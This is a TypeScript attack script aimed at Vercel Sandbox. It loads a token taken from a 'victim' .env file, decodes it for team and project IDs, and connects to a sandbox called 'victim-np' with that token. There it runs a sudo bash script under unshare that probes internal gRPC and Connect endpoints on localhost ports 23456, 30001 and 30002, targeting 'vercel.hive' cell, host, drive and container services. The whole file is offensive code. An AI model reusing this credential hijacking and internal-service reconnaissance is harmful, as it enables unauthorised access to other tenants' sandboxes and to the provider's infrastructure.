import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
echo "=== gRPC-framed POST to TCP ports ==="
for port in 23456 30001 30002; do
  echo "--- port $port ---"
  for path in \\
    "/vercel.hive.cell.api.v1.CelldService/GetInfo" \\
    "/vercel.hive.cell.api.v1.CelldService/GetInfo" \\
    "/vercel.hive.cell.api.containers.v1.ContainersService/List" \\
    "/vercel.hive.host.api.v1.HostService/GetResourceUsage" \\
    "/vercel.hive.celld.api.v1.CelldService/RegisterPort" \\
    "/vercel.hive.cell.api.drives.v1.DrivesService/ListDrives" \\
    "/vercel.hive.api.cells.v1.CellService/IsCellAlive" \\
    "/vercel.hive.api.cells.v1.CellService/GetCellAddress" \\
    ; do
    code=$(timeout 2 curl -s -o /tmp/grpc_body -w "%{http_code}" --http2-prior-knowledge -X POST \\
      -H "Content-Type: application/grpc" -H "TE: trailers" -H "Content-Length: 5" \\
      --data-binary @/tmp/empty.msg "http://127.0.0.1:$port$path" 2>/dev/null)
    if [ "$code" != "000" ] && [ "$code" != "404" ]; then
      echo "*** gRPC $path :$port -> HTTP $code ***"
      head -c 400 /tmp/grpc_body; echo ""
    fi
  done
done
echo "=== Connect JSON RPC POST ==="
for port in 23456 30001 30002; do
  for path in "/vercel.hive.cell.api.v1.CelldService.GetInfo" "/vercel.hive.cell.api.v1.CelldService/GetInfo" "/vercel.hive.cell.api.containers.v1.ContainersService.List"; do
    code=$(timeout 2 curl -s -o /tmp/crpc_body -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{}' "http://127.0.0.1:$port$path" 2>/dev/null)
    if [ "$code" != "000" ] && [ "$code" != "404" ]; then
      echo "*** connect $path :$port -> HTTP $code ***"
      head -c 300 /tmp/crpc_body; echo ""
    fi
  done
done
echo "=== try /v1/ prefix variants ==="
for port in 23456 30001 30002; do
  for path in "/v1/health" "/v1/status" "/v1/cell" "/v1/drives" "/api/health" "/internal/health" "/" "/index.html" "/favicon.ico"; do
    code=$(timeout 1 curl -s -o /tmp/x -w "%{http_code}" "http://127.0.0.1:$port$path" 2>/dev/null)
    if [ "$code" != "404" ] && [ "$code" != "000" ]; then
      echo "*** $path :$port -> HTTP $code: $(head -c 200 /tmp/x) ***"
    fi
  done
done
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore35.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore35.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
